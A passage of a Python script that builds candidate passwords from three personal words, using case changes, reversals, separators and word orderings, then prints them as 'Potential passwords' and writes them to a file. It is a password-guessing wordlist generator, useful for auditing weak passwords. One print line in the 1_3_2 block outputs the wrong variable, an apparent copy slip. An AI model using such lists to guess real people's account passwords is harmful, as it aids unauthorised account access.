        pass_3_2_upper = user_input_3.upper() + user_input_2.upper()
        pass_3_2_lower = user_input_3.lower() + user_input_2.lower()
        pass_3_2_title = user_input_3.title() + user_input_2.title()
        pass_3_2_capitalize = user_input_3.capitalize() + user_input_2.capitalize()
        pass_3_2_swapcase = user_input_3.swapcase() + user_input_2.swapcase()
        pass_3_2_colon = ":".join(user_input_3) + ":".join(user_input_2)
        pass_3_2_dot = ".".join(user_input_3) + ".".join(user_input_2)
        pass_3_2_space = " ".join(user_input_3) + " ".join(user_input_2)
        pass_3_2_underscore = "_".join(user_input_3) + "_".join(user_input_2)
        pass_3_2_reverse = user_input_3[::-1] + user_input_2[::-1]
        pass_3_2_upper_reverse = user_input_3.upper()[::-1] + user_input_2.upper()[::-1]
        pass_3_2_lower_reverse = user_input_3.lower()[::-1] + user_input_2.lower()[::-1]
        pass_3_2_title_reverse = user_input_3.title()[::-1] + user_input_2.title()[::-1]
        pass_3_2_capitalize_reverse = user_input_3.capitalize()[::-1] + user_input_2.capitalize()[::-1]
        pass_3_2_swapcase_reverse = user_input_3.swapcase()[::-1] + user_input_2.swapcase()[::-1]
        pass_3_2_colon_reverse = ":".join(user_input_3)[::-1] + ":".join(user_input_2)[::-1]
        pass_3_2_dot_reverse = ".".join(user_input_3)[::-1] + ".".join(user_input_2)[::-1]
        pass_3_2_space_reverse = " ".join(user_input_3)[::-1] + " ".join(user_input_2)[::-1]
        pass_3_2_underscore_reverse = "_".join(user_input_3)[::-1] + "_".join(user_input_2)[::-1]
    # User input 1 + user input 2 + user input 3
        pass_1_2_3 = user_input_1 + user_input_2 + user_input_3
        pass_1_2_3_upper = user_input_1.upper() + user_input_2.upper() + user_input_3.upper()
        pass_1_2_3_lower = user_input_1.lower() + user_input_2.lower() + user_input_3.lower()
        pass_1_2_3_title = user_input_1.title() + user_input_2.title() + user_input_3.title()
        pass_1_2_3_capitalize = user_input_1.capitalize() + user_input_2.capitalize() + user_input_3.capitalize()
        pass_1_2_3_swapcase = user_input_1.swapcase() + user_input_2.swapcase() + user_input_3.swapcase()
        pass_1_2_3_colon = ":".join(user_input_1) + ":".join(user_input_2) + ":".join(user_input_3)
        pass_1_2_3_dot = ".".join(user_input_1) + ".".join(user_input_2) + ".".join(user_input_3)
        pass_1_2_3_space = " ".join(user_input_1) + " ".join(user_input_2) + " ".join(user_input_3)
        pass_1_2_3_underscore = "_".join(user_input_1) + "_".join(user_input_2) + "_".join(user_input_3)
        pass_1_2_3_reverse = user_input_1[::-1] + user_input_2[::-1] + user_input_3[::-1]
        pass_1_2_3_upper_reverse = user_input_1.upper()[::-1] + user_input_2.upper()[::-1] + user_input_3.upper()[::-1]
        pass_1_2_3_lower_reverse = user_input_1.lower()[::-1] + user_input_2.lower()[::-1] + user_input_3.lower()[::-1]
        pass_1_2_3_title_reverse = user_input_1.title()[::-1] + user_input_2.title()[::-1] + user_input_3.title()[::-1]
        pass_1_2_3_capitalize_reverse = user_input_1.capitalize()[::-1] + user_input_2.capitalize()[::-1] + user_input_3.capitalize()[::-1]
        pass_1_2_3_swapcase_reverse = user_input_1.swapcase()[::-1] + user_input_2.swapcase()[::-1] + user_input_3.swapcase()[::-1]
        pass_1_2_3_colon_reverse = ":".join(user_input_1)[::-1] + ":".join(user_input_2)[::-1] + ":".join(user_input_3)[::-1]
        pass_1_2_3_dot_reverse = ".".join(user_input_1)[::-1] + ".".join(user_input_2)[::-1] + ".".join(user_input_3)[::-1]
        pass_1_2_3_space_reverse = " ".join(user_input_1)[::-1] + " ".join(user_input_2)[::-1] + " ".join(user_input_3)[::-1]
        pass_1_2_3_underscore_reverse = "_".join(user_input_1)[::-1] + "_".join(user_input_2)[::-1] + "_".join(user_input_3)[::-1]
    # User input 1 + user input 3 + user input 2
        pass_1_3_2 = user_input_1 + user_input_3 + user_input_2
        pass_1_3_2_upper = user_input_1.upper() + user_input_3.upper() + user_input_2.upper()
        pass_1_3_2_lower = user_input_1.lower() + user_input_3.lower() + user_input_2.lower()
        pass_1_3_2_title = user_input_1.title() + user_input_3.title() + user_input_2.title()
        pass_1_3_2_capitalize = user_input_1.capitalize() + user_input_3.capitalize() + user_input_2.capitalize()
        pass_1_3_2_swapcase = user_input_1.swapcase() + user_input_3.swapcase() + user_input_2.swapcase()
        pass_1_3_2_colon = ":".join(user_input_1) + ":".join(user_input_3) + ":".join(user_input_2)
        pass_1_3_2_dot = ".".join(user_input_1) + ".".join(user_input_3) + ".".join(user_input_2)
        pass_1_3_2_space = " ".join(user_input_1) + " ".join(user_input_3) + " ".join(user_input_2)
        pass_1_3_2_underscore = "_".join(user_input_1) + "_".join(user_input_3) + "_".join(user_input_2)
        pass_1_3_2_reverse = user_input_1[::-1] + user_input_3[::-1] + user_input_2[::-1]
        pass_1_3_2_upper_reverse = user_input_1.upper()[::-1] + user_input_3.upper()[::-1] + user_input_2.upper()[::-1]
        pass_1_3_2_lower_reverse = user_input_1.lower()[::-1] + user_input_3.lower()[::-1] + user_input_2.lower()[::-1]
        pass_1_3_2_title_reverse = user_input_1.title()[::-1] + user_input_3.title()[::-1] + user_input_2.title()[::-1]
        pass_1_3_2_capitalize_reverse = user_input_1.capitalize()[::-1] + user_input_3.capitalize()[::-1] + user_input_2.capitalize()[::-1]
        pass_1_3_2_swapcase_reverse = user_input_1.swapcase()[::-1] + user_input_3.swapcase()[::-1] + user_input_2.swapcase()[::-1]
        pass_1_3_2_colon_reverse = ":".join(user_input_1)[::-1] + ":".join(user_input_3)[::-1] + ":".join(user_input_2)[::-1]
        pass_1_3_2_dot_reverse = ".".join(user_input_1)[::-1] + ".".join(user_input_3)[::-1] + ".".join(user_input_2)[::-1]
        pass_1_3_2_space_reverse = " ".join(user_input_1)[::-1] + " ".join(user_input_3)[::-1] + " ".join(user_input_2)[::-1]
        pass_1_3_2_underscore_reverse = "_".join(user_input_1)[::-1] + "_".join(user_input_3)[::-1] + "_".join(user_input_2)[::-1]
    # User input 2 + user input 1 + user input 3
        pass_2_1_3 = user_input_2 + user_input_1 + user_input_3
        pass_2_1_3_upper = user_input_2.upper() + user_input_1.upper() + user_input_3.upper()
        pass_2_1_3_lower = user_input_2.lower() + user_input_1.lower() + user_input_3.lower()
        pass_2_1_3_title = user_input_2.title() + user_input_1.title() + user_input_3.title()
        pass_2_1_3_capitalize = user_input_2.capitalize() + user_input_1.capitalize() + user_input_3.capitalize()
        pass_2_1_3_swapcase = user_input_2.swapcase() + user_input_1.swapcase() + user_input_3.swapcase()
        pass_2_1_3_colon = ":".join(user_input_2) + ":".join(user_input_1) + ":".join(user_input_3)
        pass_2_1_3_dot = ".".join(user_input_2) + ".".join(user_input_1) + ".".join(user_input_3)
        pass_2_1_3_space = " ".join(user_input_2) + " ".join(user_input_1) + " ".join(user_input_3)
        pass_2_1_3_underscore = "_".join(user_input_2) + "_".join(user_input_1) + "_".join(user_input_3)
        pass_2_1_3_reverse = user_input_2[::-1] + user_input_1[::-1] + user_input_3[::-1]
        pass_2_1_3_upper_reverse = user_input_2.upper()[::-1] + user_input_1.upper()[::-1] + user_input_3.upper()[::-1]
        pass_2_1_3_lower_reverse = user_input_2.lower()[::-1] + user_input_1.lower()[::-1] + user_input_3.lower()[::-1]
        pass_2_1_3_title_reverse = user_input_2.title()[::-1] + user_input_1.title()[::-1] + user_input_3.title()[::-1]
        pass_2_1_3_capitalize_reverse = user_input_2.capitalize()[::-1] + user_input_1.capitalize()[::-1] + user_input_3.capitalize()[::-1]
        pass_2_1_3_swapcase_reverse = user_input_2.swapcase()[::-1] + user_input_1.swapcase()[::-1] + user_input_3.swapcase()[::-1]
        pass_2_1_3_colon_reverse = ":".join(user_input_2)[::-1] + ":".join(user_input_1)[::-1] + ":".join(user_input_3)[::-1]
        pass_2_1_3_dot_reverse = ".".join(user_input_2)[::-1] + ".".join(user_input_1)[::-1] + ".".join(user_input_3)[::-1]
        pass_2_1_3_space_reverse = " ".join(user_input_2)[::-1] + " ".join(user_input_1)[::-1] + " ".join(user_input_3)[::-1]
        pass_2_1_3_underscore_reverse = "_".join(user_input_2)[::-1] + "_".join(user_input_1)[::-1] + "_".join(user_input_3)[::-1]
    # User input 2 + user input 3 + user input 1
        pass_2_3_1 = user_input_2 + user_input_3 + user_input_1
        pass_2_3_1_upper = user_input_2.upper() + user_input_3.upper() + user_input_1.upper()
        pass_2_3_1_lower = user_input_2.lower() + user_input_3.lower() + user_input_1.lower()
        pass_2_3_1_title = user_input_2.title() + user_input_3.title() + user_input_1.title()
        pass_2_3_1_capitalize = user_input_2.capitalize() + user_input_3.capitalize() + user_input_1.capitalize()
        pass_2_3_1_swapcase = user_input_2.swapcase() + user_input_3.swapcase() + user_input_1.swapcase()
        pass_2_3_1_colon = ":".join(user_input_2) + ":".join(user_input_3) + ":".join(user_input_1)
        pass_2_3_1_dot = ".".join(user_input_2) + ".".join(user_input_3) + ".".join(user_input_1)
        pass_2_3_1_space = " ".join(user_input_2) + " ".join(user_input_3) + " ".join(user_input_1)
        pass_2_3_1_underscore = "_".join(user_input_2) + "_".join(user_input_3) + "_".join(user_input_1)
        pass_2_3_1_reverse = user_input_2[::-1] + user_input_3[::-1] + user_input_1[::-1]
        pass_2_3_1_upper_reverse = user_input_2.upper()[::-1] + user_input_3.upper()[::-1] + user_input_1.upper()[::-1]
        pass_2_3_1_lower_reverse = user_input_2.lower()[::-1] + user_input_3.lower()[::-1] + user_input_1.lower()[::-1]
        pass_2_3_1_title_reverse = user_input_2.title()[::-1] + user_input_3.title()[::-1] + user_input_1.title()[::-1]
        pass_2_3_1_capitalize_reverse = user_input_2.capitalize()[::-1] + user_input_3.capitalize()[::-1] + user_input_1.capitalize()[::-1]
        pass_2_3_1_swapcase_reverse = user_input_2.swapcase()[::-1] + user_input_3.swapcase()[::-1] + user_input_1.swapcase()[::-1]
        pass_2_3_1_colon_reverse = ":".join(user_input_2)[::-1] + ":".join(user_input_3)[::-1] + ":".join(user_input_1)[::-1]
        pass_2_3_1_dot_reverse = ".".join(user_input_2)[::-1] + ".".join(user_input_3)[::-1] + ".".join(user_input_1)[::-1]
        pass_2_3_1_space_reverse = " ".join(user_input_2)[::-1] + " ".join(user_input_3)[::-1] + " ".join(user_input_1)[::-1]
        pass_2_3_1_underscore_reverse = "_".join(user_input_2)[::-1] + "_".join(user_input_3)[::-1] + "_".join(user_input_1)[::-1]
    # User input 3 + user input 1 + user input 2
        pass_3_1_2 = user_input_3 + user_input_1 + user_input_2
        pass_3_1_2_upper = user_input_3.upper() + user_input_1.upper() + user_input_2.upper()
        pass_3_1_2_lower = user_input_3.lower() + user_input_1.lower() + user_input_2.lower()
        pass_3_1_2_title = user_input_3.title() + user_input_1.title() + user_input_2.title()
        pass_3_1_2_capitalize = user_input_3.capitalize() + user_input_1.capitalize() + user_input_2.capitalize()
        pass_3_1_2_swapcase = user_input_3.swapcase() + user_input_1.swapcase() + user_input_2.swapcase()
        pass_3_1_2_colon = ":".join(user_input_3) + ":".join(user_input_1) + ":".join(user_input_2)
        pass_3_1_2_dot = ".".join(user_input_3) + ".".join(user_input_1) + ".".join(user_input_2)
        pass_3_1_2_space = " ".join(user_input_3) + " ".join(user_input_1) + " ".join(user_input_2)
        pass_3_1_2_underscore = "_".join(user_input_3) + "_".join(user_input_1) + "_".join(user_input_2)
        pass_3_1_2_reverse = user_input_3[::-1] + user_input_1[::-1] + user_input_2[::-1]
        pass_3_1_2_upper_reverse = user_input_3.upper()[::-1] + user_input_1.upper()[::-1] + user_input_2.upper()[::-1]
        pass_3_1_2_lower_reverse = user_input_3.lower()[::-1] + user_input_1.lower()[::-1] + user_input_2.lower()[::-1]
        pass_3_1_2_title_reverse = user_input_3.title()[::-1] + user_input_1.title()[::-1] + user_input_2.title()[::-1]
        pass_3_1_2_capitalize_reverse = user_input_3.capitalize()[::-1] + user_input_1.capitalize()[::-1] + user_input_2.capitalize()[::-1]
        pass_3_1_2_swapcase_reverse = user_input_3.swapcase()[::-1] + user_input_1.swapcase()[::-1] + user_input_2.swapcase()[::-1]
        pass_3_1_2_colon_reverse = ":".join(user_input_3)[::-1] + ":".join(user_input_1)[::-1] + ":".join(user_input_2)[::-1]
        pass_3_1_2_dot_reverse = ".".join(user_input_3)[::-1] + ".".join(user_input_1)[::-1] + ".".join(user_input_2)[::-1]
        pass_3_1_2_space_reverse = " ".join(user_input_3)[::-1] + " ".join(user_input_1)[::-1] + " ".join(user_input_2)[::-1]
        pass_3_1_2_underscore_reverse = "_".join(user_input_3)[::-1] + "_".join(user_input_1)[::-1] + "_".join(user_input_2)[::-1]
    # User input 3 + user input 2 + user input 1
        pass_3_2_1 = user_input_3 + user_input_2 + user_input_1
        pass_3_2_1_upper = user_input_3.upper() + user_input_2.upper() + user_input_1.upper()
        pass_3_2_1_lower = user_input_3.lower() + user_input_2.lower() + user_input_1.lower()
        pass_3_2_1_title = user_input_3.title() + user_input_2.title() + user_input_1.title()
        pass_3_2_1_capitalize = user_input_3.capitalize() + user_input_2.capitalize() + user_input_1.capitalize()
        pass_3_2_1_swapcase = user_input_3.swapcase() + user_input_2.swapcase() + user_input_1.swapcase()
        pass_3_2_1_colon = ":".join(user_input_3) + ":".join(user_input_2) + ":".join(user_input_1)
        pass_3_2_1_dot = ".".join(user_input_3) + ".".join(user_input_2) + ".".join(user_input_1)
        pass_3_2_1_space = " ".join(user_input_3) + " ".join(user_input_2) + " ".join(user_input_1)
        pass_3_2_1_underscore = "_".join(user_input_3) + "_".join(user_input_2) + "_".join(user_input_1)
        pass_3_2_1_reverse = user_input_3[::-1] + user_input_2[::-1] + user_input_1[::-1]
        pass_3_2_1_upper_reverse = user_input_3.upper()[::-1] + user_input_2.upper()[::-1] + user_input_1.upper()[::-1]
        pass_3_2_1_lower_reverse = user_input_3.lower()[::-1] + user_input_2.lower()[::-1] + user_input_1.lower()[::-1]
        pass_3_2_1_title_reverse = user_input_3.title()[::-1] + user_input_2.title()[::-1] + user_input_1.title()[::-1]
        pass_3_2_1_capitalize_reverse = user_input_3.capitalize()[::-1] + user_input_2.capitalize()[::-1] + user_input_1.capitalize()[::-1]
        pass_3_2_1_swapcase_reverse = user_input_3.swapcase()[::-1] + user_input_2.swapcase()[::-1] + user_input_1.swapcase()[::-1]
        pass_3_2_1_colon_reverse = ":".join(user_input_3)[::-1] + ":".join(user_input_2)[::-1] + ":".join(user_input_1)[::-1]
        pass_3_2_1_dot_reverse = ".".join(user_input_3)[::-1] + ".".join(user_input_2)[::-1] + ".".join(user_input_1)[::-1]
        pass_3_2_1_space_reverse = " ".join(user_input_3)[::-1] + " ".join(user_input_2)[::-1] + " ".join(user_input_1)[::-1]
        pass_3_2_1_underscore_reverse = "_".join(user_input_3)[::-1] + "_".join(user_input_2)[::-1] + "_".join(user_input_1)[::-1]
        print("Potential passwords: ")
        print(user_input_1)
        print(pass_1_upper)
        print(pass_1_lower)
        print(pass_1_title)
        print(pass_1_capitalize)
        print(pass_1_swapcase)
        print(pass_1_colon)
        print(pass_1_dot)
        print(pass_1_space)
        print(pass_1_underscore)
        print(pass_1_reverse)
        print(pass_1_upper_reverse)
        print(pass_1_lower_reverse)
        print(pass_1_title_reverse)
        print(pass_1_capitalize_reverse)
        print(pass_1_swapcase_reverse)
        print(pass_1_colon_reverse)
        print(pass_1_dot_reverse)
        print(pass_1_space_reverse)
        print(pass_1_underscore_reverse)
        print(user_input_2)
        print(pass_2_upper)
        print(pass_2_lower)
        print(pass_2_title)
        print(pass_2_capitalize)
        print(pass_2_swapcase)
        print(pass_2_colon)
        print(pass_2_dot)
        print(pass_2_space)
        print(pass_2_underscore)
        print(pass_2_reverse)
        print(pass_2_upper_reverse)
        print(pass_2_lower_reverse)
        print(pass_2_title_reverse)
        print(pass_2_capitalize_reverse)
        print(pass_2_swapcase_reverse)
        print(pass_2_colon_reverse)
        print(pass_2_dot_reverse)
        print(pass_2_space_reverse)
        print(pass_2_underscore_reverse)
        print(user_input_3)
        print(pass_3_upper)
        print(pass_3_lower)
        print(pass_3_title)
        print(pass_3_capitalize)
        print(pass_3_swapcase)
        print(pass_3_colon)
        print(pass_3_dot)
        print(pass_3_space)
        print(pass_3_underscore)
        print(pass_3_reverse)
        print(pass_3_upper_reverse)
        print(pass_3_lower_reverse)
        print(pass_3_title_reverse)
        print(pass_3_capitalize_reverse)
        print(pass_3_swapcase_reverse)
        print(pass_3_colon_reverse)
        print(pass_3_dot_reverse)
        print(pass_3_space_reverse)
        print(pass_3_underscore_reverse)
        print(pass_1_2)
        print(pass_1_2_upper)
        print(pass_1_2_lower)
        print(pass_1_2_title)
        print(pass_1_2_capitalize)
        print(pass_1_2_swapcase)
        print(pass_1_2_colon)
        print(pass_1_2_dot)
        print(pass_1_2_space)
        print(pass_1_2_underscore)
        print(pass_1_2_reverse)
        print(pass_1_2_upper_reverse)
        print(pass_1_2_lower_reverse)
        print(pass_1_2_title_reverse)
        print(pass_1_2_capitalize_reverse)
        print(pass_1_2_swapcase_reverse)
        print(pass_1_2_colon_reverse)
        print(pass_1_2_dot_reverse)
        print(pass_1_2_space_reverse)
        print(pass_1_2_underscore_reverse)
        print(pass_1_3)
        print(pass_1_3_upper)
        print(pass_1_3_lower)
        print(pass_1_3_title)
        print(pass_1_3_capitalize)
        print(pass_1_3_swapcase)
        print(pass_1_3_colon)
        print(pass_1_3_dot)
        print(pass_1_3_space)
        print(pass_1_3_underscore)
        print(pass_1_3_reverse)
        print(pass_1_3_upper_reverse)
        print(pass_1_3_lower_reverse)
        print(pass_1_3_title_reverse)
        print(pass_1_3_capitalize_reverse)
        print(pass_1_3_swapcase_reverse)
        print(pass_1_3_colon_reverse)
        print(pass_1_3_dot_reverse)
        print(pass_1_3_space_reverse)
        print(pass_1_3_underscore_reverse)
        print(pass_2_1)
        print(pass_2_1_upper)
        print(pass_2_1_lower)
        print(pass_2_1_title)
        print(pass_2_1_capitalize)
        print(pass_2_1_swapcase)
        print(pass_2_1_colon)
        print(pass_2_1_dot)
        print(pass_2_1_space)
        print(pass_2_1_underscore)
        print(pass_2_1_reverse)
        print(pass_2_1_upper_reverse)
        print(pass_2_1_lower_reverse)
        print(pass_2_1_title_reverse)
        print(pass_2_1_capitalize_reverse)
        print(pass_2_1_swapcase_reverse)
        print(pass_2_1_colon_reverse)
        print(pass_2_1_dot_reverse)
        print(pass_2_1_space_reverse)
        print(pass_2_1_underscore_reverse)
        print(pass_2_3)
        print(pass_2_3_upper)
        print(pass_2_3_lower)
        print(pass_2_3_title)
        print(pass_2_3_capitalize)
        print(pass_2_3_swapcase)
        print(pass_2_3_colon)
        print(pass_2_3_dot)
        print(pass_2_3_space)
        print(pass_2_3_underscore)
        print(pass_2_3_reverse)
        print(pass_2_3_upper_reverse)
        print(pass_2_3_lower_reverse)
        print(pass_2_3_title_reverse)
        print(pass_2_3_capitalize_reverse)
        print(pass_2_3_swapcase_reverse)
        print(pass_2_3_colon_reverse)
        print(pass_2_3_dot_reverse)
        print(pass_2_3_space_reverse)
        print(pass_2_3_underscore_reverse)
        print(pass_3_1)
        print(pass_3_1_upper)
        print(pass_3_1_lower)
        print(pass_3_1_title)
        print(pass_3_1_capitalize)
        print(pass_3_1_swapcase)
        print(pass_3_1_colon)
        print(pass_3_1_dot)
        print(pass_3_1_space)
        print(pass_3_1_underscore)
        print(pass_3_1_reverse)
        print(pass_3_1_upper_reverse)
        print(pass_3_1_lower_reverse)
        print(pass_3_1_title_reverse)
        print(pass_3_1_capitalize_reverse)
        print(pass_3_1_swapcase_reverse)
        print(pass_3_1_colon_reverse)
        print(pass_3_1_dot_reverse)
        print(pass_3_1_space_reverse)
        print(pass_3_1_underscore_reverse)
        print(pass_3_2)
        print(pass_3_2_upper)
        print(pass_3_2_lower)
        print(pass_3_2_title)
        print(pass_3_2_capitalize)
        print(pass_3_2_swapcase)
        print(pass_3_2_colon)
        print(pass_3_2_dot)
        print(pass_3_2_space)
        print(pass_3_2_underscore)
        print(pass_3_2_reverse)
        print(pass_3_2_upper_reverse)
        print(pass_3_2_lower_reverse)
        print(pass_3_2_title_reverse)
        print(pass_3_2_capitalize_reverse)
        print(pass_3_2_swapcase_reverse)
        print(pass_3_2_colon_reverse)
        print(pass_3_2_dot_reverse)
        print(pass_3_2_space_reverse)
        print(pass_3_2_underscore_reverse)
        print(pass_1_2_3)
        print(pass_1_2_3_upper)
        print(pass_1_2_3_lower)
        print(pass_1_2_3_title)
        print(pass_1_2_3_capitalize)
        print(pass_1_2_3_swapcase)
        print(pass_1_2_3_colon)
        print(pass_1_2_3_dot)
        print(pass_1_2_3_space)
        print(pass_1_2_3_underscore)
        print(pass_1_2_3_reverse)
        print(pass_1_2_3_upper_reverse)
        print(pass_1_2_3_lower_reverse)
        print(pass_1_2_3_title_reverse)
        print(pass_1_2_3_capitalize_reverse)
        print(pass_1_2_3_swapcase_reverse)
        print(pass_1_2_3_colon_reverse)
        print(pass_1_2_3_dot_reverse)
        print(pass_1_2_3_space_reverse)
        print(pass_1_2_3_underscore_reverse)
        print(pass_1_3_2)
        print(pass_1_3_2_upper)
        print(pass_1_3_2_lower)
        print(pass_1_3_2_title)
        print(pass_1_3_2_capitalize)
        print(pass_1_3_2_swapcase)
        print(pass_1_3_2_colon)
        print(pass_1_3_2_dot)
        print(pass_1_3_2_space)
        print(pass_1_3_2_underscore)
        print(pass_1_3_2_reverse)
        print(pass_1_3_2_upper_reverse)
        print(pass_1_3_2_lower_reverse)
        print(pass_1_3_2_title_reverse)
        print(pass_1_3_2_capitalize_reverse)
        print(pass_1_3_2_swapcase_reverse)
        print(pass_1_3_2_colon_reverse)
        print(pass_3_2_dot_reverse)
        print(pass_1_3_2_space_reverse)
        print(pass_1_3_2_underscore_reverse)
        print(pass_2_1_3)
        print(pass_2_1_3_upper)
        print(pass_2_1_3_lower)
        print(pass_2_1_3_title)
        print(pass_2_1_3_capitalize)
        print(pass_2_1_3_swapcase)
        print(pass_2_1_3_colon)
        print(pass_2_1_3_dot)
        print(pass_2_1_3_space)
        print(pass_2_1_3_underscore)
        print(pass_2_1_3_reverse)
        print(pass_2_1_3_upper_reverse)
        print(pass_2_1_3_lower_reverse)
        print(pass_2_1_3_title_reverse)
        print(pass_2_1_3_capitalize_reverse)
        print(pass_2_1_3_swapcase_reverse)
        print(pass_2_1_3_colon_reverse)
        print(pass_2_1_3_dot_reverse)
        print(pass_2_1_3_space_reverse)
        print(pass_2_1_3_underscore_reverse)
        print(pass_2_3_1)
        print(pass_2_3_1_upper)
        print(pass_2_3_1_lower)
        print(pass_2_3_1_title)
        print(pass_2_3_1_capitalize)
        print(pass_2_3_1_swapcase)
        print(pass_2_3_1_colon)
        print(pass_2_3_1_dot)
        print(pass_2_3_1_space)
        print(pass_2_3_1_underscore)
        print(pass_2_3_1_reverse)
        print(pass_2_3_1_upper_reverse)
        print(pass_2_3_1_lower_reverse)
        print(pass_2_3_1_title_reverse)
        print(pass_2_3_1_capitalize_reverse)
        print(pass_2_3_1_swapcase_reverse)
        print(pass_2_3_1_colon_reverse)
        print(pass_2_3_1_dot_reverse)
        print(pass_2_3_1_space_reverse)
        print(pass_2_3_1_underscore_reverse)
        print(pass_3_1_2)
        print(pass_3_1_2_upper)
        print(pass_3_1_2_lower)
        print(pass_3_1_2_title)
        print(pass_3_1_2_capitalize)
        print(pass_3_1_2_swapcase)
        print(pass_3_1_2_colon)
        print(pass_3_1_2_dot)
        print(pass_3_1_2_space)
        print(pass_3_1_2_underscore)
        print(pass_3_1_2_reverse)
        print(pass_3_1_2_upper_reverse)
        print(pass_3_1_2_lower_reverse)
        print(pass_3_1_2_title_reverse)
        print(pass_3_1_2_capitalize_reverse)
        print(pass_3_1_2_swapcase_reverse)
        print(pass_3_1_2_colon_reverse)
        print(pass_3_1_2_dot_reverse)
        print(pass_3_1_2_space_reverse)
        print(pass_3_1_2_underscore_reverse)
        print(pass_3_2_1)
        print(pass_3_2_1_upper)
        print(pass_3_2_1_lower)
        print(pass_3_2_1_title)
        print(pass_3_2_1_capitalize)
        print(pass_3_2_1_swapcase)
        print(pass_3_2_1_colon)
        print(pass_3_2_1_dot)
        print(pass_3_2_1_space)
        print(pass_3_2_1_underscore)
        print(pass_3_2_1_reverse)
        print(pass_3_2_1_upper_reverse)
        print(pass_3_2_1_lower_reverse)
        print(pass_3_2_1_title_reverse)
        print(pass_3_2_1_capitalize_reverse)
        print(pass_3_2_1_swapcase_reverse)
        print(pass_3_2_1_colon_reverse)
        print(pass_3_2_1_dot_reverse)
        print(pass_3_2_1_space_reverse)
        print(pass_3_2_1_underscore_reverse)
    # Write to a file
        if write_user_input == "Yes":
            fobj = open(path, 'w')
            fobj.write(user_input_1 + "\n")
            fobj.write(pass_1_upper + "\n")
            fobj.write(pass_1_lower + "\n")
            fobj.write(pass_1_title + "\n")
            fobj.write(pass_1_capitalize + "\n")
            fobj.write(pass_1_swapcase + "\n")
            fobj.write(pass_1_colon + "\n")
            fobj.write(pass_1_dot + "\n")
            fobj.write(pass_1_space + "\n")
            fobj.write(pass_1_underscore + "\n")
            fobj.write(pass_1_reverse + "\n")
            fobj.write(pass_1_upper_reverse + "\n")
            fobj.write(pass_1_lower_reverse + "\n")
            fobj.write(pass_1_title_reverse + "\n")
            fobj.write(pass_1_capitalize_reverse + "\n")
            fobj.write(pass_1_swapcase_reverse + "\n")
            fobj.write(pass_1_colon_reverse + "\n")
            fobj.write(pass_1_dot_reverse + "\n")
            fobj.write(pass_1_space_reverse + "\n")
            fobj.write(pass_1_underscore_reverse + "\n")
            fobj.write(user_input_2 + "\n")
            fobj.write(pass_2_upper + "\n")
            fobj.write(pass_2_lower + "\n")
            fobj.write(pass_2_title + "\n")
            fobj.write(pass_2_capitalize + "\n")
            fobj.write(pass_2_swapcase + "\n")
            fobj.write(pass_2_colon + "\n")
            fobj.write(pass_2_dot + "\n")
            fobj.write(pass_2_space + "\n")
            fobj.write(pass_2_underscore + "\n")
            fobj.write(pass_2_reverse + "\n")
            fobj.write(pass_2_upper_reverse + "\n")
            fobj.write(pass_2_lower_reverse + "\n")
            fobj.write(pass_2_title_reverse + "\n")
            fobj.write(pass_2_capitalize_reverse + "\n")
            fobj.write(pass_2_swapcase_reverse + "\n")
            fobj.write(pass_2_colon_reverse + "\n")
            fobj.write(pass_2_dot_reverse + "\n")
            fobj.write(pass_2_space_reverse + "\n")
            fobj.write(pass_2_underscore_reverse + "\n")
            fobj.write(user_input_3 + "\n")
            fobj.write(pass_3_upper + "\n")
            fobj.write(pass_3_lower + "\n")
            fobj.write(pass_3_title + "\n")
            fobj.write(pass_3_capitalize + "\n")
            fobj.write(pass_3_swapcase + "\n")
            fobj.write(pass_3_colon + "\n")
            fobj.write(pass_3_dot + "\n")
            fobj.write(pass_3_space + "\n")
            fobj.write(pass_3_underscore + "\n")
            fobj.write(pass_3_reverse + "\n")
            fobj.write(pass_3_upper_reverse + "\n")
            fobj.write(pass_3_lower_reverse + "\n")
            fobj.write(pass_3_title_reverse + "\n")
            fobj.write(pass_3_capitalize_reverse + "\n")
            fobj.write(pass_3_swapcase_reverse + "\n")
            fobj.write(pass_3_colon_reverse + "\n")
            fobj.write(pass_3_dot_reverse + "\n")
            fobj.write(pass_3_space_reverse + "\n")
            fobj.write(pass_3_underscore_reverse + "\n")
            fobj.write(pass_1_2 + "\n")
            fobj.write(pass_1_2_upper + "\n")
            fobj.write(pass_1_2_lower + "\n")
            fobj.write(pass_1_2_title + "\n")
            fobj.write(pass_1_2_capitalize + "\n")
            fobj.write(pass_1_2_swapcase + "\n")
            fobj.write(pass_1_2_colon + "\n")
            fobj.write(pass_1_2_dot + "\n")
            fobj.write(pass_1_2_space + "\n")
            fobj.write(pass_1_2_underscore + "\n")
            fobj.write(pass_1_2_reverse + "\n")
            fobj.write(pass_1_2_upper_reverse + "\n")
            fobj.write(pass_1_2_lower_reverse + "\n")
            fobj.write(pass_1_2_title_reverse + "\n")
            fobj.write(pass_1_2_capitalize_reverse + "\n")
            fobj.write(pass_1_2_swapcase_reverse + "\n")
            fobj.write(pass_1_2_colon_reverse + "\n")
            fobj.write(pass_1_2_dot_reverse + "\n")
            fobj.write(pass_1_2_space_reverse + "\n")
            fobj.write(pass_1_2_underscore_reverse + "\n")
            fobj.write(pass_1_3 + "\n")
            fobj.write(pass_1_3_upper + "\n")
            fobj.write(pass_1_3_lower + "\n")
            fobj.write(pass_1_3_title + "\n")
            fobj.write(pass_1_3_capitalize + "\n")
            fobj.write(pass_1_3_swapcase + "\n")
            fobj.write(pass_1_3_colon + "\n")
            fobj.write(pass_1_3_dot + "\n")
            fobj.write(pass_1_3_space + "\n")
            fobj.write(pass_1_3_underscore + "\n")
            fobj.write(pass_1_3_reverse + "\n")
            fobj.write(pass_1_3_upper_reverse + "\n")
            fobj.write(pass_1_3_lower_reverse + "\n")
            fobj.write(pass_1_3_title_reverse + "\n")
            fobj.write(pass_1_3_capitalize_reverse + "\n")
            fobj.write(pass_1_3_swapcase_reverse + "\n")
            fobj.write(pass_1_3_colon_reverse + "\n")
            fobj.write(pass_1_3_dot_reverse + "\n")
            fobj.write(pass_1_3_space_reverse + "\n")
            fobj.write(pass_1_3_underscore_reverse + "\n")
            fobj.write(pass_2_1 + "\n")
            fobj.write(pass_2_1_upper + "\n")
            fobj.write(pass_2_1_lower + "\n")
            fobj.write(pass_2_1_title + "\n")
            fobj.write(pass_2_1_capitalize + "\n")
            fobj.write(pass_2_1_swapcase + "\n")
            fobj.write(pass_2_1_colon + "\n")
            fobj.write(pass_2_1_dot + "\n")
            fobj.write(pass_2_1_space + "\n")
            fobj.write(pass_2_1_underscore + "\n")
            fobj.write(pass_2_1_reverse + "\n")
            fobj.write(pass_2_1_upper_reverse + "\n")
